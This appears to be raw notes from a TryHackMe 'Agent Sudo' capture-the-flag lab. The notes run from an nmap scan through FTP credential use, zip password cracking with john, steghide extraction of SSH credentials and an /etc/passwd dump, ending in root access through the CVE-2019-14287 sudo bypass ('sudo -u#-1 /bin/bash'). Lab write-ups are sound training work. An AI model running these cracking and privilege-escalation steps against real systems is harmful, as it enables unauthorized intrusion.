@@ -1,0 +1,265 @@
+# Nmap 7.95 scan initiated Sat Jul 19 01:31:58 2025 as: /usr/lib/nmap/nmap --privileged -sV -T4 -p- -oN nmap.txt -vv 10.10.11.80
+Nmap scan report for 10.10.11.80
+Host is up, received echo-reply ttl 63 (0.048s latency).
+Scanned at 2025-07-19 01:31:59 CEST for 143s
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jul 19 01:34:22 2025 -- 1 IP address (1 host up) scanned in 143.38 seconds
+
+
+
+
+http://10.10.11.80/
+
+
+
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R
+
+
+curl -A "C" -I http://10.10.11.80/
+
+HTTP/1.1 302 Found
+Date: Sat, 19 Jul 2025 00:16:29 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Location: agent_C_attention.php
+Content-Type: text/html; charset=UTF-8
+
+
+
+[21][ftp] host: 10.10.11.80   login: chris   password: crystal
+
+lftp 10.10.11.80
+
+mget *
+
+
+kali:~/github/tryhackme/agentsudo/loot$ ls -al
+total 96
+drwxrwxr-x 3 kali kali  4096 Jul 19 02:39 .
+drwxrwxr-x 9 kali kali  4096 Jul 19 01:31 ..
+-rw-rw-r-- 1 kali kali 33143 Oct 29  2019 cute-alien.jpg
+-rw-rw-r-- 1 kali kali 34842 Oct 29  2019 cutie.png
+-rw-rw-r-- 1 kali kali   217 Oct 29  2019 To_agentJ.txt
+
+
+
+binwalk -e cutie.png                                                         
+                                                                                                                     
+DECIMAL       HEXADECIMAL     DESCRIPTION                                                                            
+--------------------------------------------------------------------------------                                     
+869           0x365           Zlib compressed data, best compression                                                 
+                                                                                                                     
+WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar
+', 'jar xvf '%e'' might not be installed correctly                                                                   
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR
+.txt                                                                                                                 
+                                                                                                                     
+WARNING: One or more files failed to extract: either no utility was found or it's unimplemented                      
+                                                                                                                     
+                                            
+kali:~/github/tryhackme/agentsudo/loot$ zip2john secret.zip > zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Cost 1 (HMAC size) is 78 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alien            (secret.zip/To_agentR.txt)     
+1g 0:00:00:00 DONE (2025-07-19 02:39) 5.263g/s 129347p/s 129347c/s 129347C/s christal..280789
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+kali:~/github/tryhackme/agentsudo/loot$ cat To_agentR.txt 
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+
+Base64 => Area51
+
+
+
+
+steghide extract -sf cute-alien.jpg 
+Enter passphrase: 
+wrote extracted data to "message.txt".
+
+
+
+
+cat message.txt  
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+
+
+james:hackerrules!
+
+
+ssh james@10.10.11.80  
+The authenticity of host '10.10.11.80 (10.10.11.80)' can't be established.
+ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.80' (ED25519) to the list of known hosts.
+james@10.10.11.80's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jul 19 00:44:21 UTC 2025
+
+  System load:  0.0               Processes:           103
+  Usage of /:   39.9% of 9.78GB   Users logged in:     0
+  Memory usage: 22%               IP address for ens5: 10.10.11.80
+  Swap usage:   0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+james@agent-sudo:~$ 
+
+
+
+james@agent-sudo:~$ uname -a
+Linux agent-sudo 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+james@agent-sudo:~$ 
+
+
+/usr/bin/traceroute6.iputils                                                                                         
+/usr/bin/sudo                                                                                                        
+/usr/bin/chsh                                                                                                        
+/usr/bin/newuidmap                                                                                                   
+/usr/bin/pkexec                                                                                                      
+/usr/bin/gpasswd                                                                                                     
+/usr/bin/chfn                                                                                                        
+/usr/bin/newgrp                                                                                                      
+/usr/bin/passwd                                                                                                      
+/usr/bin/newgidmap                                                                                                   
+/usr/bin/at                                                                                                          
+/bin/su                                                                                                              
+/bin/fusermount                                                                                                      
+/bin/ping                                                                                                            
+/bin/umount
+
+
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+james@agent-sudo:~$ 
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+james:x:1000:1000:james:/home/james:/bin/bash
+ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+chris:x:1001:1001::/var/FTP:/bin/sh
+
+
+james@agent-sudo:~$ ls -al
+total 80
+drwxr-xr-x 4 james james  4096 Oct 29  2019 .
+drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
+-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
+-rw------- 1 root  root    566 Oct 29  2019 .bash_history
+-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
+drwx------ 2 james james  4096 Oct 29  2019 .cache
+drwx------ 3 james james  4096 Oct 29  2019 .gnupg
+-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
+-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
+-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
+
+
+
+james@agent-sudo:~$ cat user_flag.txt
+b03d975e8c92a7c04146cfa7a5a313c7
+
+
+CVE-2019-14287
+https://www.exploit-db.com/exploits/47502
+
+
+james@agent-sudo:~/pwn$ sudo -u#-1 /bin/bash 
+
+root@agent-sudo:~# cd /root
+root@agent-sudo:/root# ls -al
+total 32
+drwx------  4 root root 4096 Oct 29  2019 .
+drwxr-xr-x 24 root root 4096 Oct 29  2019 ..
+-rw-------  1 root root 1952 Oct 29  2019 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwxr-xr-x  3 root root 4096 Oct 29  2019 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  197 Oct 29  2019 root.txt
+drwx------  2 root root 4096 Oct 29  2019 .ssh
+root@agent-sudo:/root# cat root.txt 
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+root@agent-sudo:/root# 
+
+
+
